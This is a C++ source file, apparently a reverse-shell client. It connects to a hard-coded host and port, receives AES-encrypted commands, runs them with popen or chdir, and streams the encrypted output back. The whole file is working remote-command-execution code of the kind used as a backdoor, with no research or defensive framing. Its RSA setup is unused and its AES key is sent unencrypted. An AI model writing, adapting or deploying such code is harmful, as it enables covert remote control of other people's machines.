#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/dir.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#include <cryptopp/rsa.h>
#include <cryptopp/sha.h>
#include <cryptopp/filters.h>
#include <cryptopp/osrng.h>
#include <cryptopp/aes.h>
#include <cryptopp/modes.h>

#include <base64.h>

using std::string;
using namespace CryptoPP;

const int max = 10000;

RSA::PrivateKey *myPriv;
RSA::PublicKey *myPub;

RSAES_OAEP_SHA_Encryptor *encryptor;
RSAES_OAEP_SHA_Decryptor *decryptor;

CFB_Mode<AES>::Encryption *cfbEncryption;
CFB_Mode<AES>::Decryption *cfbDecryption;

AutoSeededRandomPool rng;

char *buf;
int mainSocket;

void clearBuf() {
    for (int i = 0; i <= max; i++)
        buf[i] = 0;
}

string encryptRSA(string text) {
    string res;
    StringSource(text, true,
        new PK_EncryptorFilter(rng, *encryptor,
            new StringSink(res)));

    return res;
}

string decryptRSA(string text) {
    string res;
    StringSource(text, true,
        new PK_DecryptorFilter(rng, *decryptor,
            new StringSink(res)));

    return res;
}

void initRSA() {
    InvertibleRSAFunction parameters;
    parameters.GenerateRandomWithKeySize(rng, 4096);

    myPriv = new RSA::PrivateKey(parameters);
    myPub = new RSA::PublicKey(parameters);

    encryptor = new RSAES_OAEP_SHA_Encryptor(*myPub);
    decryptor = new RSAES_OAEP_SHA_Decryptor(*myPriv);
}

void initAES() {
    SecByteBlock key(0x00, AES::DEFAULT_KEYLENGTH);
    rng.GenerateBlock(key, key.size());

    byte initVector[AES::BLOCKSIZE];
    rng.GenerateBlock(initVector, AES::BLOCKSIZE);

    //sprintf(buf, "%d\n%d\n", AES::DEFAULT_KEYLENGTH, AES::BLOCKSIZE);
    //send(mainSocket, buf, strlen(buf), 0);

    printf("sending aes... ");

    send(mainSocket, key.BytePtr(), AES::DEFAULT_KEYLENGTH, 0);
    send(mainSocket, initVector, AES::BLOCKSIZE, 0);

    printf("sended\n");

    cfbEncryption = new CFB_Mode<AES>::Encryption(key, key.size(), initVector);
    cfbDecryption = new CFB_Mode<AES>::Decryption(key, key.size(), initVector);
}

void sendEncrypted(const byte *message, int len) {
    byte buf[len];
    cfbEncryption->ProcessData(buf, message, len);
    string s = base64_encode(buf, len);
    s.push_back('\n');
    send(mainSocket, s.c_str(), s.length(), 0);
}

void sendEncrypted(const char *message, int len) {
    sendEncrypted((const byte*)message, len);
}

void recvDecrypted() {
    recv(mainSocket, buf, max, 0);
    string half = base64_decode(string((char*)buf));
    cfbDecryption->ProcessData((byte*)buf, (byte*)half.c_str(), half.size());
    buf[half.size()] = 0;
}

void initNET() {
    mainSocket = socket(AF_INET, SOCK_STREAM, 0);
    buf = (char *)malloc(max + 2) + 1;

    sockaddr addr;
    addr.sa_family = AF_INET;
    *((unsigned short*)&addr + 1) = htons(24953);
    *((int*)&addr + 1) = htonl(inet_network("127.0.0.1"));

    connect(mainSocket, &addr, sizeof(addr));
}

int main() {
    initRSA();
    initNET();
    initAES();

    while (true) {
        clearBuf();

        recvDecrypted();

        if (buf[0] == 'c' && buf[1] == 'd' && buf[2] == ' ') {
            chdir(buf + 3);
            getcwd(buf, max);
            buf[-1] = 'D';
            sendEncrypted(buf - 1, strlen(buf) + 1);
        } else {
            FILE *out = popen(buf, "r");

            if (out == NULL) {
                sendEncrypted("not found", 10);
                continue;
            }

            buf[-1] = 'O';
            while (fgets(buf, max, out) != NULL)
                sendEncrypted(buf - 1, strlen(buf) + 1);

            fclose(out);
            buf[-1] = 'E';
            sendEncrypted(buf - 1, 1);
        }
    }

    return 0;
}
